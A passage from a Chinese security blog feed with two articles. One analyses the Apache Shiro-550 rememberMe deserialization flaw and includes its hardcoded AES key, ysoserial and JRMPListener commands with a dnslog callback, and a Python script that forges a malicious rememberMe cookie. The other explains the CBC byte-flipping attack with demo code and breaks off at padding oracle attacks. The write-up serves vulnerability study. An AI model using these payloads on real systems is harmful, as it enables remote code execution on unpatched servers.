alt=""></p><p>跟进convertBytesToPrincipals()函数，先判断是否有加密算法服务，这里看到是使用CBC模式的AES加密算法的，其中Padding规则是PKCS5，然后开始调用decrypt()函数来对前面Base64解密后的字节数组进行AES解密操作：</p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/12.png" alt=""></p><p>跟进decrypt()函数，其中调用CipherService类的decrypt()函数来进一步解密，这里解密细节无需过多探究，再往下就是得到解密后的序列化字节数组并返回：</p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/13.png" alt=""></p><p>注意到，这里AES加密算法是对称加密算法，即加密和解密的Key是一样的，上面是通过调用AbstractRememberMeManager类的getDecryptionCipherKey()函数来获取解密Key的，跟进去查看后，发现AbstractRememberMeManager类的构造函数默认就调用setCipherKey()函数来设置加解密的Key了，而该Key则是硬编码写死在其中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* The following Base64 string was generated by auto-generating an AES Key:</span></span><br><span class="line"><span class="comment">* &lt;pre&gt;</span></span><br><span class="line"><span class="comment">* AesCipherService aes = new AesCipherService();</span></span><br><span class="line"><span class="comment">* byte[] key = aes.generateNewKey().getEncoded();</span></span><br><span class="line"><span class="comment">* String base64 = Base64.encodeToString(key);</span></span><br><span class="line"><span class="comment">* &lt;/pre&gt;</span></span><br><span class="line"><span class="comment">* The value of 'base64' was copied-n-pasted here:</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">AbstractRememberMeManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.serializer = <span class="keyword">new</span> DefaultSerializer&lt;PrincipalCollection&gt;();</span><br><span class="line">    <span class="keyword">this</span>.cipherService = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">    setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCipherKey</span><span class="params">(<span class="keyword">byte</span>[] cipherKey)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//Since this method should only be used in symmetric ciphers</span></span><br><span class="line">    <span class="comment">//(where the enc and dec keys are the same), set it on both:</span></span><br><span class="line">    setEncryptionCipherKey(cipherKey);</span><br><span class="line">    setDecryptionCipherKey(cipherKey);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回到convertBytesToPrincipals()函数后，就是直接注意调用deserialize()函数对返回的序列化字节数组进行反序列化操作：</p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/14.png" alt=""></p><p>往下，就是用默认反序列化器来进行反序列化操作，即熟悉的readObject()：</p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/15.png" alt=""></p><p>至此，Shiro对Cookie的rememberMe的处理流程已整体调试分析完了。</p><h3 id="部分Gadget打失败的坑"><a href="#部分Gadget打失败的坑" class="headerlink" title="部分Gadget打失败的坑"></a>部分Gadget打失败的坑</h3><p>使用如下命令来打本地靶机环境并未成功，但环境中确实存在漏洞版本的CommonsCollections包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections5 &quot;calc&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure><p>看服务端主要有如下报错信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2020-10-09 16:43:17,920 TRACE [org.apache.shiro.util.ClassUtils]: Unable to load clazz named [org.apache.commons.collections.keyvalue.TiedMapEntry] from class loader [ParallelWebappClassLoader</span><br><span class="line">2020-10-09 16:43:18,082 TRACE [org.apache.shiro.util.ClassUtils]: Unable to load clazz named [org.apache.commons.collections.map.LazyMap] from class loader [ParallelWebappClassLoader</span><br><span class="line">2020-10-09 16:43:19,335 TRACE [org.apache.shiro.util.ClassUtils]: Unable to load clazz named [org.apache.commons.collections.functors.ChainedTransformer] from class loader [ParallelWebappClassLoader</span><br><span class="line">2020-10-09 16:43:19,567 TRACE [org.apache.shiro.util.ClassUtils]: Unable to load clazz named [[Lorg.apache.commons.collections.Transformer;] from class loader [ParallelWebappClassLoader</span><br><span class="line">2020-10-09 16:43:19,736 TRACE [org.apache.shiro.util.ClassUtils]: Unable to load clazz named [org.apache.commons.collections.functors.ConstantTransformer] from class loader [ParallelWebappClassLoader</span><br><span class="line">2020-10-09 16:43:20,112 TRACE [org.apache.shiro.util.ClassUtils]: Unable to load class named [org.apache.commons.collections.functors.InvokerTransformer] from the current ClassLoader.  Trying the system/application ClassLoader...</span><br></pre></td></tr></table></figure><p>也就是说，在环境中找不到TiedMapEntry、LazyMap、ChainedTransformer、Transformer、ConstantTransformer、InvokerTransformer这几个本该在JDK环境中就存在的类。</p><p>调试发现，该payload在readObject()的调用中会调用到org/apache/shiro/io/ClassResolvingObjectInputStream类的resolverClass()函数，很明显ClassResolvingObjectInputStream类继承了ObjectInputStream类并重写了resolverClass()函数，其中调用forName()来反射获取类：</p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/16.png" alt=""></p><p>跟进到forName()函数中调试发现，就是前面报错信息显示的那几个类在不同类加载器的loadClass()函数中调用时并没有加载成功从而返回null和打印如上的报错信息：</p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/17.png" alt=""></p><p>这里先使用THREAD_CL_ACCESSOR类加载器加载，加载失败返回为null后继续使用CLASS_CL_ACCESSOR类加载器加载，加载失败返回为null后再继续使用SYSTEM_CL_ACCESSOR加载器加载，均为null则打印报错信息并抛出异常。</p><p>分别跟进loadClass()函数看到，前两个是通过ParallelWebappClassLoader这个类加载器来加载类的、而最后一个是通过Launcher$AppClassLoader这个来加载器来加载类的，但是均加载失败打印错误日志并返回null：</p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/18.png" alt=""></p><p>至于坑点在哪，这里不做探讨，可参考<a href="https://xz.aliyun.com/t/7950#toc-3" target="_blank" rel="noopener">这篇文章</a>来调试分析，我们现在只是来看看怎么让payload可行就可以了。</p><p>网上的文章给出的关键点就是使用JRMP来打。</p><p>先开启恶意JRMP服务端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-6eca5bc740-1.jar ysoserial.exploit.JRMPListener 1234 CommonsCollections5 &quot;ping jrmp.0tweer.dnslog.cn&quot;</span><br></pre></td></tr></table></figure><p>然后使用JRMP客户端连接恶意JRMP服务端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial-master-6eca5bc740-1.jar'</span>, <span class="string">'JRMPClient'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line">    BS   = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key  =  <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv   =  uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># JRMP</span></span><br><span class="line">    payload = encode_rememberme(<span class="string">'172.21.0.1:1234'</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"rememberMe=&#123;&#125;"</span>.format(payload.decode()))</span><br></pre></td></tr></table></figure><p>打过去就可以了：</p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/21.png" alt=""></p><p>当然，本地环境和远程环境有点区别，这块坑这里就不涉及了，大伙可自行踩坑填坑。</p><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>看到Apache Shiro 1.2.5版本的源码，修复方法就是将使用默认Key加密改为生成随机的Key加密：<a href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848" target="_blank" rel="noopener">https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848</a></p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/22.png" alt=""></p><h2 id="0x03-工具"><a href="#0x03-工具" class="headerlink" title="0x03 工具"></a>0x03 工具</h2><p>推荐ShiroExploit工具，其中包括对硬编码Key和Padding Oracle Attack两种类型Apache Shiro反序列化漏洞的多种检测方式和漏洞利用，集成了AES加密算法Key字典以及ysoserial工具的Gadgets，十分方便：<a href="https://github.com/feihong-cs/ShiroExploit" target="_blank" rel="noopener">https://github.com/feihong-cs/ShiroExploit</a></p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/7.png" alt=""></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://xz.aliyun.com/t/7950" target="_blank" rel="noopener">Shiro-1.2.4-RememberMe 反序列化踩坑深入分析</a></p><p><a href="https://xz.aliyun.com/t/7207" target="_blank" rel="noopener">Apache Shiro源码浅析之从远古洞到最新PaddingOracle CBC</a></p><p><a href="https://www.cnblogs.com/xiaozi/p/13239046.html" target="_blank" rel="noopener">Shiro反序列化漏洞利用汇总（Shiro-550+Shiro-721）</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Shiro" scheme="https://www.mi1k7ea.com/tags/Shiro/"/>
    
  </entry>
  
  <entry>
    <title>浅析CBC字节翻转攻击与Padding Oracle Attack</title>
    <link href="https://www.mi1k7ea.com/2020/09/17/%E6%B5%85%E6%9E%90CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E4%B8%8EPadding-Oracle-Attack/"/>
    <id>https://www.mi1k7ea.com/2020/09/17/浅析CBC字节翻转攻击与Padding-Oracle-Attack/</id>
    <published>2020-09-17T09:24:13.000Z</published>
    <updated>2020-10-03T07:43:48.114Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>有时候日志审计会看到Padding Oracle Attack相关的事件，但个人对这块不熟就学习做下笔记吧，都是参考学习网上大佬们的文章。</p><h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="异或（XOR）"><a href="#异或（XOR）" class="headerlink" title="异或（XOR）"></a>异或（XOR）</h3><p>异或（XOR）是一个数学运算符。它应用于逻辑运算。异或的数学符号为“⊕”，计算机符号为“xor”。其运算法则为：</p><p>a⊕b = (¬a ∧ b) ∨ (a ∧¬b)</p><p>如果a、b两个值不相同，则异或结果为1。如果a、b两个值相同，异或结果为0。</p><p>在计算机中，存储的数据是以二进制的格式存入的，把两段二进制数字进行异或运算的话，相同的得0，不同的得1。字符在计算机中有对应的ASCII码值，对字符进行异或运算就是将两串字符对应的ASCII码值进行异或。</p><p>异或运算具有<strong>可逆性</strong>，a xor b = c 等价于 b xor c = a 等价于 a xor c = b。</p><h3 id="CBC模式"><a href="#CBC模式" class="headerlink" title="CBC模式"></a>CBC模式</h3><p>CBC（Cipher Block Chaining）即密码分组链接，是一种加密模式。在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。</p><h4 id="加密流程"><a href="#加密流程" class="headerlink" title="加密流程"></a>加密流程</h4><p>CBC模式加密流程如图：</p><p><img src="/2020/09/17/浅析CBC字节翻转攻击与Padding-Oracle-Attack/1.png" alt=""></p><ul><li><strong>Plaintext</strong>：明文数据；</li><li><strong>Initialzation Vector（IV）</strong>：初始向量；</li><li><strong>Key</strong>：分组加密使用的密钥；</li><li><strong>Ciphertext</strong>：密文数据；</li></ul><p>加密步骤：</p><ol><li>首先将明文分成长度相同（一般为8或16字节）的n组，其中最后一组位数不足的进行Padding操作（填充规则是PKCS #5或PKCS #7）；</li><li>生成一个随机的初始向量（IV）和一个密钥（Key）；</li><li>将IV与第一组明文进行XOR，将XOR后的结果使用Key进行加密得到第一组密文；</li><li>将第一组密文和第二组明文进行XOR，将XOR后的结果使用Key进行加密得到第二组密文；</li><li>依次类推，将第n-1组密文和第n组明文进行XOR，将XOR后的结果使用Key进行加密得到第n组密文；</li><li>将IV和得到的所有分组密文拼接到一起，得到最终的密文；</li></ol><h4 id="解密流程"><a href="#解密流程" class="headerlink" title="解密流程"></a>解密流程</h4><p>CBC模式解密流程如图：</p><p><img src="/2020/09/17/浅析CBC字节翻转攻击与Padding-Oracle-Attack/2.png" alt=""></p><p>解密步骤：</p><ol><li>首先从密文中提取出初始向量（IV），然后将密文分成n组（一般为8或16字节一组）；</li><li>使用密钥（Key）对第一组密文进行解密，得到解密的中间值我们称为Intermediary Value；</li><li>使用IV与第一组Intermediary Value进行XOR，得到第一组明文；</li><li>使用Key对第n组密文进行解密，得到第n组Intermediary Value；</li><li>使用第n-1组密文与第n组Intermediary Value进行XOR，得到第n组明文；</li><li>将所有分组明文拼接到一起，得到最终的明文；</li></ol><p>由此可得以下结论：</p><ul><li>对于第一组密文的解密：Plaintext[1] = Decrypt(Ciphertext[1]) XOR IV</li><li>对于第n组密文的解密（n&gt;1）：Plaintext[n] = Decrypt(Ciphertext[n]) XOR Ciphertext[n-1]</li></ul><h3 id="PKCS-5-PKCS-7填充模式"><a href="#PKCS-5-PKCS-7填充模式" class="headerlink" title="PKCS #5/PKCS #7填充模式"></a>PKCS #5/PKCS #7填充模式</h3><p>The Public-Key Cryptography Standards (PKCS)是由美国RSA数据安全公司及其合作伙伴制定的一组公钥密码学标准，其中包括证书申请、证书更新、证书作废表发布、扩展证书内容以及数字签名、数字信封的格式等方面的一系列相关协议。</p><p>PKCS #5是8字节填充的，即填充一定数量的内容，使得成为8的整数倍，而填充的内容取决于需要填充的数目。例如，<code>0x56</code>在经过PKCS #5填充之后会成为<code>0x56 0x07 0x07 0x07 0x07 0x07 0x07 0x07</code>因为需要填充7字节，因此填充的内容就是7。当然特殊情况下，如果已经满足了8的整倍数，按照PKCS #5的规则，仍然需要在尾部填充8个字节，并且内容是<code>0x08</code>,目的是为了加解密时统一处理填充。</p><p>PKCS #7与PKCS #5的区别在于PKCS5只填充到8字节，而PKCS #7可以在1-255之间任意填充。</p><p>具体可参考：<a href="https://blog.csdn.net/test1280/article/details/75268255" target="_blank" rel="noopener">填充模式：PKCS#5/PKCS7</a></p><p><strong>DES算法进行加密时的填充规则是PKCS #5、填充最多8位，而AES算法进行加密时的填充规则是PKCS #7、填充最多16位</strong>。</p><p>举例看下PKCS #5的填充规则，其最多填充8位，填充字节的取值范围是0x01到0x08。以下图为例：</p><p><img src="/2020/09/17/浅析CBC字节翻转攻击与Padding-Oracle-Attack/4.png" alt=""></p><p>第一行最后还差5个字符，则在最后填充5个0x05，后面类比。<strong>需注意即便分组内容能正好平均分为n组，仍需要在最后一组后面填充一个八位分组</strong>。</p><p>16字节的AES采用的是PKCS #7，填充的规则和PKCS #5是一样的，只是分组长度不一样，也就是说填充字节的取值范围是0x00到0x10。</p><h3 id="Padding-Oracle"><a href="#Padding-Oracle" class="headerlink" title="Padding Oracle"></a>Padding Oracle</h3><p>Padding在这里的含义是“填充”，因为对于加密算法来说，它们是基于等长的“数据块”进行操作的（如对于RC2，DES或TripleDES算法来说这个长度是8字节，而对于Rijndael算法来说则是16、24或32字节）。但是，我们的输入数据长度是不规则的，因此必然需要进行“填充”才能形成完整的“块”。“填充”时比较常用的是PKCS #5规则，简单地说，便是根据最后一个数据块所缺少的长度来选择填充的内容。</p><p>在解密时，如果算法发现解密后得到的结果，它的填充方式不符合规则，那么表示输入数据有问题，对于解密的类库来说，往往便会抛出一个异常，提示Padding不正确。Oracle在这里便是“提示”的意思，和甲骨文公司没有任何关系。</p><p>简单地说，<strong>Padding Oracle就是提示输入数据的填充方式不符合规则的意思</strong>。</p><h2 id="0x02-CBC字节翻转攻击"><a href="#0x02-CBC字节翻转攻击" class="headerlink" title="0x02 CBC字节翻转攻击"></a>0x02 CBC字节翻转攻击</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>在前面CBC模式的解密流程中知道，Ciphertext[n-1]（即第n-1组密文）用于与Decrypt(Ciphertext[n])即（使用Key对第n组密文解密后的结果）进行XOR生成下一组的明文Plaintext[n]，而这个点正是CBC字节翻转攻击的漏洞点——<strong>如果攻击者修改了Ciphertext[n-1]的某个字节，然后提交到服务端与Decrypt(Ciphertext[n])进行XOR运算，此时就会得到一个不同的明文。因此，攻击者可以在不知道密钥的情况下，通过篡改初始向量或密文的方式来控制明文进而实现绕过某些服务端过滤机制等</strong>。</p><p>原理如下图：</p><p><img src="/2020/09/17/浅析CBC字节翻转攻击与Padding-Oracle-Attack/3.png" alt=""></p><p>由前面知道，解密获取第n组密文为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plaintext[n] = Decrypt(Ciphertext[n]) XOR Ciphertext[n-1]</span><br></pre></td></tr></table></figure><p>由XOR可逆性可得解密的中间值为明文和上一组密文的XOR结果，这里另起名字简称为IntermediaryValue：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IntermediaryValue[n] = Decrypt(Ciphertext[n]) = Plaintext[n] XOR Ciphertext[n-1]</span><br></pre></td></tr></table></figure><p>攻击者想得到自己构造的恶意明文，是通过IntermediaryValue和自己构造的恶意上一组密文XOR实现的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Evil_Plaintext[n] = IntermediaryValue[n] XOR Evil_Ciphertext[n-1]</span><br></pre></td></tr></table></figure><p>由XOR可逆性可得：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Evil_Ciphertext[n-1] = IntermediaryValue[n] XOR Evil_Plaintext[n]</span><br></pre></td></tr></table></figure><p>进而：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Evil_Ciphertext[n-1] = Plaintext[n] XOR Ciphertext[n-1] XOR Evil_Plaintext[n]</span><br></pre></td></tr></table></figure><p>因此可得结论：<strong>在CBC字节翻转攻击中，攻击者传入的恶意IV或恶意上一组密文是根据原始明文、原始上一组密文、想得到的恶意明文三者进行异或运算得到的</strong>。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>参考网上改的Demo，已知原始明文Plaintext和原始初始向量IV，再结合想得到的恶意明文字符来通过构造恶意IV来实现攻击（这里只修改第一个分组，暂不考虑其他多个分组的情况）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(plaintext)</span>:</span></span><br><span class="line">    count = len(plaintext)</span><br><span class="line">    add = length - (count % length)</span><br><span class="line">    plaintext_padding = plaintext + (chr(add) * add)</span><br><span class="line">    <span class="keyword">return</span> plaintext_padding</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 16字节密钥Key</span></span><br><span class="line">SECRET_KEY = codecs.encode(os.urandom(<span class="number">8</span>), <span class="string">'hex_codec'</span>).upper()</span><br><span class="line"><span class="comment"># 16字节初始向量IV</span></span><br><span class="line">IV = Random.new().read(<span class="number">16</span>)</span><br><span class="line"><span class="comment"># 使用AES算法，该算法以16字节为处理单位</span></span><br><span class="line">aes = AES.new(SECRET_KEY, AES.MODE_CBC, IV)</span><br><span class="line">length = <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原明文</span></span><br><span class="line">plaintext = <span class="string">"milktea"</span></span><br><span class="line"><span class="comment"># 填充原明文</span></span><br><span class="line">plaintext_padding = padding(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用AES加密填充后的原明文</span></span><br><span class="line">cipher = aes.encrypt(plaintext_padding.encode())</span><br><span class="line">print(<span class="string">"[*]填充后的明文："</span>, plaintext_padding)</span><br><span class="line">print(<span class="string">"[*]密钥Key："</span>, SECRET_KEY)</span><br><span class="line">print(<span class="string">"[*]初始向量IV："</span>, IV)</span><br><span class="line">print(<span class="string">"[*]填充后的明文序列："</span>, list(plaintext_padding))</span><br><span class="line">print(<span class="string">"[*]密文："</span>, aes.encrypt(plaintext_padding.encode()))</span><br><span class="line"></span><br><span class="line">old_IVList = []</span><br><span class="line">plaintextList = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(codecs.encode(IV, <span class="string">'hex_codec'</span>).decode()), <span class="number">2</span>):</span><br><span class="line">    old_IVList.append(int(codecs.encode(IV, <span class="string">'hex_codec'</span>).decode()[i:i + <span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list(plaintext_padding):</span><br><span class="line">    plaintextList.append(ord(i))</span><br><span class="line"></span><br><span class="line">evil_IVList = old_IVList</span><br><span class="line"><span class="comment"># 修改制定字符</span></span><br><span class="line">evil_IVList[<span class="number">4</span>] = plaintextList[<span class="number">4</span>] ^ old_IVList[<span class="number">4</span>] ^ ord(<span class="string">'7'</span>)</span><br><span class="line">evil_IVList[<span class="number">2</span>] = plaintextList[<span class="number">2</span>] ^ old_IVList[<span class="number">2</span>] ^ ord(<span class="string">'1'</span>)</span><br><span class="line"><span class="comment"># 在末尾添加.com</span></span><br><span class="line">evil_IVList[<span class="number">7</span>] = plaintextList[<span class="number">7</span>] ^ old_IVList[<span class="number">7</span>] ^ ord(<span class="string">'.'</span>)</span><br><span class="line">evil_IVList[<span class="number">8</span>] = plaintextList[<span class="number">8</span>] ^ old_IVList[<span class="number">8</span>] ^ ord(<span class="string">'c'</span>)</span><br><span class="line">evil_IVList[<span class="number">9</span>] = plaintextList[<span class="number">9</span>] ^ old_IVList[<span class="number">9</span>] ^ ord(<span class="string">'o'</span>)</span><br><span class="line">evil_IVList[<span class="number">10</span>] = plaintextList[<span class="number">10</span>] ^ old_IVList[<span class="number">10</span>] ^ ord(<span class="string">'m'</span>)</span><br><span class="line"></span><br><span class="line">evil_IV = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> evil_IVList:</span><br><span class="line">    <span class="comment"># 为了保证构造出来的IV是16字节，1位的16进制补0变成2位</span></span><br><span class="line">    <span class="keyword">if</span> len(hex(i)[<span class="number">2</span>:]) == <span class="number">1</span>:</span><br><span class="line">        evil_IV += <span class="string">'0'</span> + hex(i)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        evil_IV += hex(i)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恶意构造的16字节IV</span></span><br><span class="line">evil_IV = codecs.decode(evil_IV, <span class="string">'hex_codec'</span>)</span><br><span class="line">print(<span class="string">"[*]恶意构造出的IV："</span>, evil_IV)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用恶意IV进行AES解密来获取新的明文</span></span><br><span class="line">aes = AES.new(SECRET_KEY, AES.MODE_CBC, evil_IV)</span><br><span class="line">dsc = aes.decrypt(cipher).decode()</span><br><span class="line">print(<span class="string">"[*]利用恶意构造的IV解密得到的明文："</span>, dsc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设服务端判断解密得到的明文满足某个条件就会进行其他恶意操作</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"mi1k7ea.com"</span> <span class="keyword">in</span> dsc:</span><br><span class="line">    print(<span class="string">"[+]CBC Byte Flipping Attack!"</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/2020/09/17/浅析CBC字节翻转攻击与Padding-Oracle-Attack/5.png" alt=""></p><p>多个分组的场景可以参考这篇文章的代码示例：<a href="https://www.freebuf.com/articles/system/163756.html" target="_blank" rel="noopener">CBC字节翻转攻击测试</a></p><h2 id="0x03-Padding-Oracle-Attack"><a href="#0x03-Padding-Oracle-Attack" class="headerlink" title="0x03 Padding Oracle Attack"></a>0x03 Padding Oracle Attack</h2><p>本部分只写针对CBC模式的Padding Oracle Attack，针对ASP .NET的场景这里暂未研究。 </p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>Padding Oracle 